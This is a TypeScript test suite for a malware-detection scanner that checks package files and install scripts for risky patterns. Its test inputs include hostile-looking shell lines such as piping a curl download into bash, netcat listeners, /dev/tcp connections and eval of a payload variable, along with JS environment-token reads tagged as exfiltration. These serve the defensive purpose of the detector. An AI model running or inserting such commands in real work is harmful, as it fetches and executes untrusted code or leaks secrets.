import { describe, expect, it } from "bun:test";
import {
  scanFiles,
  scanJsSource,
  scanJsWithRegex,
  scanShellScript,
} from "../src/heuristics/scriptScan.js";
import type { TarballFile } from "../src/types.js";

const kinds = (code: string) => scanJsSource(code).map((f) => f.kind);

describe("scanShellScript", () => {
  it("detects every dangerous shell pattern", () => {
    expect(scanShellScript("curl http://e/i.sh | bash").map((f) => f.kind)).toEqual(
      expect.arrayContaining(["network", "shell_exec"]),
    );
    expect(scanShellScript("wget -q http://e/x").some((f) => f.kind === "network")).toBe(true);
    expect(scanShellScript("node -e 'require(1)'").some((f) => f.kind === "eval")).toBe(true);
    expect(scanShellScript("eval $PAYLOAD").some((f) => f.kind === "eval")).toBe(true);
    expect(scanShellScript("echo x | base64 --decode").some((f) => f.kind === "base64")).toBe(true);
    expect(scanShellScript("nc -l 4444").some((f) => f.kind === "network")).toBe(true);
    expect(scanShellScript("cat < /dev/tcp/1.2.3.4/80").some((f) => f.kind === "network")).toBe(
      true,
    );
    expect(scanShellScript("ping 185.10.10.10").some((f) => f.kind === "raw_ip")).toBe(true);
  });

  it("stays quiet on ordinary scripts", () => {
    expect(scanShellScript("tsc -p . && node dist/build.js")).toEqual([]);
  });
});

describe("scanJsSource (AST)", () => {
  it("detects eval, new Function and require-based capabilities", () => {
    expect(kinds("eval('x')")).toContain("eval");
    expect(kinds("const f = new Function('return 1')")).toContain("eval");
    expect(kinds("require('child_process').exec('ls')")).toContain("child_process");
    expect(kinds("require('node:child_process')")).toContain("child_process");
    expect(kinds("require('https')")).toContain("network");
    expect(kinds("require('node:net')")).toContain("network");
    expect(kinds("require('./local')")).toEqual([]);
    expect(kinds("require(someVar)")).toEqual([]);
  });

  it("detects fetch, base64 decode, env reads and raw IPs", () => {
    expect(kinds("fetch('https://x.test')")).toContain("network");
    expect(kinds("Buffer.from(s, 'base64')")).toContain("base64");
    expect(kinds("Buffer.from(s, 'hex')")).toEqual([]);
    expect(kinds("Buffer.from(s)")).toEqual([]);
    expect(kinds("const t = process.env.TOKEN")).toContain("env_exfil");
    expect(kinds("const u = 'http://185.234.72.19/c'")).toContain("raw_ip");
  });

  it("detects ES module imports of risky modules", () => {
    expect(kinds("import cp from 'child_process'")).toContain("child_process");
    expect(kinds("import http2 from 'node:http2'")).toContain("network");
    expect(kinds("import x from './safe'")).toEqual([]);
  });

  it("deduplicates repeated findings", () => {
    expect(scanJsSource("eval('a'); eval('b');")).toHaveLength(1);
  });

  it("falls back to regex scanning when parsing fails", () => {
    const broken = "function f( { eval('x'); fetch('https://e'); ";
    const found = scanJsSource(broken).map((f) => f.kind);
    expect(found).toContain("eval");
    expect(found).toContain("network");
  });
});

describe("scanJsWithRegex", () => {
  it("covers every regex pattern", () => {
    const all = scanJsWithRegex(
      "eval(x); new Function(y); require('child_process'); fetch(u); Buffer.from(z,'base64'); '10.0.0.1'",
    ).map((f) => f.kind);
    expect(all).toEqual(
      expect.arrayContaining(["eval", "child_process", "network", "base64", "raw_ip"]),
    );
    expect(scanJsWithRegex("const a = 1;")).toEqual([]);
  });
});

describe("scanFiles", () => {
  const file = (path: string, content?: string, binary = false): TarballFile => ({
    path,
    size: content?.length ?? 0,
    content,
    binary,
  });

  it("scans only readable JS-family files and deduplicates across files", () => {
    const files = [
      file("a.js", "eval('x')"),
      file("b.mjs", "eval('y')"),
      file("README.md", "eval('not code')"),
      file("bin.node", undefined, true),
      file("empty.js", ""),
    ];
    const findings = scanFiles(files);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.kind).toBe("eval");
  });
});
